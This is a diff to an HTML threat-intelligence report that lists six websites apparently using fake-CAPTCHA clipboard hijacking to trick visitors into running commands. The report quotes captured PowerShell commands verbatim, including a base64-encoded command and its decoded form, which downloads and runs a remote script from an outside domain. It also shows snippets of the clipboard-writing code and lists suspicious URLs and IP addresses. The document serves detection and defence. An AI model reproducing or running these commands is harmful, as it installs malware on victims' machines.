@@ -507,8 +507,8 @@
         <h1 class="report-title">Threat Intelligence Report</h1>
         <div class="report-meta">
             <span>📅 April 24, 2025</span>
-            <span>🕒 Generated: N/A</span>
-            <span>🔍 Sites Analyzed: 0</span>
+            <span>🕒 Generated: 2025-04-24 11:58:11</span>
+            <span>🔍 Sites Analyzed: 6</span>
         </div>
     </div>
 </section>
@@ -517,34 +517,34 @@
 <div class="summary-grid">
     <div class="summary-card total">
         <div class="summary-icon">🌐</div>
-        <div class="summary-value">0</div>
+        <div class="summary-value">6</div>
         <div class="summary-label">Total Sites Analyzed</div>
     </div>
     
     <div class="summary-card threats">
         <div class="summary-icon">⚠️</div>
-        <div class="summary-value">0</div>
+        <div class="summary-value">6</div>
         <div class="summary-label">Malicious Sites</div>
         <div class="summary-change">
-                                        <span class="change-up">0% detection rate</span>
+                                        <span class="change-up">100.0% detection rate</span>
         </div>
     </div>
     
     <div class="summary-card powershell">
         <div class="summary-icon">💻</div>
-        <div class="summary-value">0</div>
+        <div class="summary-value">3</div>
         <div class="summary-label">PowerShell Commands</div>
     </div>
     
     <div class="summary-card clipboard">
         <div class="summary-icon">📋</div>
-        <div class="summary-value">0</div>
+        <div class="summary-value">15</div>
         <div class="summary-label">Clipboard Hijacks</div>
     </div>
     
     <div class="summary-card score">
         <div class="summary-icon">📊</div>
-        <div class="summary-value">0</div>
+        <div class="summary-value">57</div>
         <div class="summary-label">Avg Threat Score</div>
     </div>
 </div>
@@ -561,11 +561,11 @@
     
     <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-bottom: 2rem;">
         <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
-            <div style="font-size: 1.5rem; font-weight: 700; color: #dc2626;">0</div>
+            <div style="font-size: 1.5rem; font-weight: 700; color: #dc2626;">3</div>
             <div style="font-size: 0.9rem; color: var(--text-light);">High Risk Commands</div>
         </div>
         <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
-            <div style="font-size: 1.5rem; font-weight: 700; color: #f59e0b;">0</div>
+            <div style="font-size: 1.5rem; font-weight: 700; color: #f59e0b;">13</div>
             <div style="font-size: 0.9rem; color: var(--text-light);">Base64 Encoded</div>
         </div>
         <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
@@ -587,11 +587,732 @@
     </div>
     
     
-        <div class="empty-state">
-            <div class="empty-icon">🎉</div>
-            <h3>No malicious sites detected</h3>
-            <p>All analyzed URLs appear to be safe</p>
+        
+        <div class="site-card" data-url="http://82.146.62.232/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">http://82.146.62.232/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            18 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-critical">Score: 85</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">PowerShell</span>
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-1')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-1')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-1')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-1" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">powershell</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">4</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">7</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">high risk commands</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-1" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            💻 PowerShell Commands
+                            <span class="indicator-count">3</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">POWerShEll -W h &#34;[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#39;aWV4IChpd3IgJ2h0dHBzOi8vYW1hem9uLW55LWdpZnRzLmNvbS9zaGVsbHNhanNoZGFzZC9mdHBha3NqZGthc2Rqa3huY2t6eG4veXdPVmtrZW0udHh0JyAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50&#39;)) | iex&#34;`;</div>
+                            
+                            <div class="indicator-item">iex (iwr &#39;https://amazon-ny-gifts.com/shellsajshdasd/ftpaksjdkasdjkxnckzxn/ywOVkkem.txt&#39; -UseBasicParsing)</div>
+                            
+                            <div class="indicator-item">iwr </div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">22</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">CAPTCHA Verification</div>
+                            
+                            <div class="indicator-item">Verification ID</div>
+                            
+                            <div class="indicator-item">I am not a robot</div>
+                            
+                            <div class="indicator-item">captcha-box</div>
+                            
+                            <div class="indicator-item">captcha-logo</div>
+                            
+                            <div class="indicator-item">captcha</div>
+                            
+                            <div class="indicator-item">CAPTCHA-logo</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">2</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">https://use.fontawesome.com/releases/v5.0.0/css/all.css</div>
+                            
+                            <div class="indicator-item">https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-1" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...tempTextArea.select(); document.execCommand(&#34;copy&#34;); document.body.removeChild(tempText...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...k&#34;, function (event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function(){ showCaptchaLoading(); },500); setTimeout(function(){ showVerifyWindow(); },900) } function showCaptchaLoading() { checkboxBtnSpinner.style.visibility = &#34;visible&#34;; checkboxBtnSpinner.style.opacity = &#34;1&#34;; checkboxBtnSpinner.style.animation = &#34;spin 1s linear infinite&#34;; } function hideCaptchaLoading...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
         </div>
+        
+        <div class="site-card" data-url="https://bookinterpagecen.com/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://bookinterpagecen.com/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            6 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-high">Score: 55</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-2')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-2')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-2')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-2" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-2" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">29</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">captcha-container</div>
+                            
+                            <div class="indicator-item">captcha-box</div>
+                            
+                            <div class="indicator-item">captcha-checkbox</div>
+                            
+                            <div class="indicator-item">captcha-label</div>
+                            
+                            <div class="indicator-item">captcha-logo</div>
+                            
+                            <div class="indicator-item">captcha-instructions</div>
+                            
+                            <div class="indicator-item">captchaBox</div>
+                            
+                            <div class="indicator-item">captcha\_checkbox</div>
+                            
+                            <div class="indicator-item">CaptchaClick</div>
+                            
+                            <div class="indicator-item">captchaLabel</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-2" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...d &amp;&amp; navigator.clipboard.writeText) { navigator.clipboard.writeText(captcha) .then(() =&gt; console.log(&#34;Ca...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...mpEl); tempEl.select(); try { document.execCommand(&#39;copy&#39;); } catch (e) { console.error(&#34;Fall...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://bookgetlisting.click/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://bookgetlisting.click/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            6 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-high">Score: 55</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-3')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-3')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-3')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-3" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-3" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">29</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">captcha-container</div>
+                            
+                            <div class="indicator-item">captcha-box</div>
+                            
+                            <div class="indicator-item">captcha-checkbox</div>
+                            
+                            <div class="indicator-item">captcha-label</div>
+                            
+                            <div class="indicator-item">captcha-logo</div>
+                            
+                            <div class="indicator-item">captcha-instructions</div>
+                            
+                            <div class="indicator-item">captchaBox</div>
+                            
+                            <div class="indicator-item">captcha\_checkbox</div>
+                            
+                            <div class="indicator-item">CaptchaClick</div>
+                            
+                            <div class="indicator-item">captchaLabel</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-3" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...d &amp;&amp; navigator.clipboard.writeText) { navigator.clipboard.writeText(captcha) .then(() =&gt; console.log(&#34;Ca...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...mpEl); tempEl.select(); try { document.execCommand(&#39;copy&#39;); } catch (e) { console.error(&#34;Fall...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://complaintguest2.com/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://complaintguest2.com/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            11 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-high">Score: 55</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-4')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-4')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-4')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-4" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">6</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-4" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">12</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">captcha-container</div>
+                            
+                            <div class="indicator-item">captcha-logo</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">Captcha</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                            <div class="indicator-item">CaptchaLoading</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">navigator.clipboard.writeText</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-4" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...dedText].map(char =&gt; char.charCodeAt(0)))); navigator.clipboard.writeText(utf8Text); if (click) return; fetch(&#39;/...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...stener(&#34;click&#34;, function(event) { event.preventDefault(); verifyBtn.disabled = true; verifyCaptcha(); }); checkboxBtn.addEventListener(&#34;click&#34;, function(event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } addCaptchaListeners(); function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function() { showCaptchaLoading(); }, 500) setTimeout(function() { showVerifyWindow(); }, 900) } function showCaptchaCheckbox() { checkboxBtn.styl...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://booking.complaintguest2.com/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://booking.complaintguest2.com/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            11 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-high">Score: 55</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                        <span class="attack-type-badge">Fake CAPTCHA</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-5')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-5')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-5')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-5" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">2</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">3</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">captcha</div>
+                        </div>
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">6</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">base64</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-5" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">12</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">captcha-container</div>
+                            
+                            <div class="indicator-item">captcha-logo</div>
+                            
+                            <div class="indicator-item">CAPTCHA</div>
+                            
+                            <div class="indicator-item">Captcha</div>
+                            
+                            <div class="indicator-item">CaptchaListeners</div>
+                            
+                            <div class="indicator-item">CaptchaCheckbox</div>
+                            
+                            <div class="indicator-item">CaptchaLoading</div>
+                            
+                            <div class="indicator-item">captcha-iogo</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">navigator.clipboard.writeText</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-5" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...dedText].map(char =&gt; char.charCodeAt(0)))); navigator.clipboard.writeText(utf8Text); if (click) return; fetch(&#39;/...</pre>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...stener(&#34;click&#34;, function(event) { event.preventDefault(); verifyBtn.disabled = true; verifyCaptcha(); }); checkboxBtn.addEventListener(&#34;click&#34;, function(event) { event.preventDefault(); checkboxBtn.disabled = true; runClickedCheckboxEffects(); }); } } addCaptchaListeners(); function runClickedCheckboxEffects() { hideCaptchaCheckbox(); setTimeout(function() { showCaptchaLoading(); }, 500) setTimeout(function() { showVerifyWindow(); }, 900) } function showCaptchaCheckbox() { checkboxBtn.styl...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        <div class="site-card" data-url="https://zerrocostygfypj.blogspot.com/">
+            <div class="site-header" onclick="toggleSite(this)">
+                <div class="site-header-content">
+                    <div>
+                        <div class="site-url">https://zerrocostygfypj.blogspot.com/</div>
+                        <div style="margin-top: 0.5rem; color: var(--text-light); font-size: 0.9rem;">
+                            1 indicators detected
+                        </div>
+                    </div>
+                    <div class="site-badges">
+                        
+                        <span class="threat-score-badge score-medium">Score: 35</span>
+                        
+                        
+                        
+                        <span class="attack-type-badge">Clipboard Hijacking</span>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="site-details">
+                <div class="detail-tabs">
+                    <button class="detail-tab active" onclick="showTab(this, 'overview-6')">Overview</button>
+                    <button class="detail-tab" onclick="showTab(this, 'indicators-6')">Indicators</button>
+                    <button class="detail-tab" onclick="showTab(this, 'code-6')">Malicious Code</button>
+                </div>
+                
+                <!-- Overview Tab -->
+                <div id="overview-6" class="tab-content active">
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; margin-bottom: 1.5rem;">
+                        
+                        <div style="text-align: center; padding: 1rem; background: #f9fafb; border-radius: 8px;">
+                            <div style="font-size: 1.25rem; font-weight: 600; color: #667eea;">1</div>
+                            <div style="font-size: 0.85rem; color: var(--text-light); text-transform: capitalize;">clipboard</div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                <!-- Indicators Tab -->
+                <div id="indicators-6" class="tab-content">
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🔍 Suspicious Keywords
+                            <span class="indicator-count">11</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">Robot</div>
+                            
+                            <div class="indicator-item">robot</div>
+                            
+                            <div class="indicator-item">&lt;script async=&#39;async&#39; src=</div>
+                            
+                            <div class="indicator-item">&lt;script type=&#34;text/javascript&#34; src=</div>
+                            
+                            <div class="indicator-item">&lt;script\&gt;</div>
+                            
+                            <div class="indicator-item">\x3d</div>
+                            
+                            <div class="indicator-item">\x3c</div>
+                            
+                            <div class="indicator-item">\x22</div>
+                            
+                            <div class="indicator-item">\x3e</div>
+                            
+                            <div class="indicator-item">\x27</div>
+                            
+                        </div>
+                    </div>
+                    
+                    
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">
+                            🌐 Extracted URLs
+                            <span class="indicator-count">40</span>
+                        </h4>
+                        <div class="indicator-list">
+                            
+                            <div class="indicator-item">http://www.google.com/2005/gml/b</div>
+                            
+                            <div class="indicator-item">http://www.google.com/2005/gml/data</div>
+                            
+                            <div class="indicator-item">http://www.google.com/2005/gml/expr</div>
+                            
+                            <div class="indicator-item">https://dfmnation.net/qgd0o</div>
+                            
+                            <div class="indicator-item">https://zerrocostygfypj.blogspot.com/favicon.ico</div>
+                            
+                        </div>
+                    </div>
+                    
+                </div>
+                
+                <!-- Code Tab -->
+                <div id="code-6" class="tab-content">
+                    
+                    <div class="indicator-group">
+                        <h4 class="indicator-title">📋 Clipboard Manipulation Code</h4>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+                                                                        <pre>...ync&#39; src=&#39;https://www.gstatic.com/external_hosted/clipboardjs/clipboard.min.js&#39;&gt;&lt;/script&gt; &lt;meta name=&#39;google-ad...</pre>
+                        </div>
+                        
+                    </div>
+                    
+                    
+                    
+                </div>
+            </div>
+        </div>
+        
+        
+        
     
 </section>
 
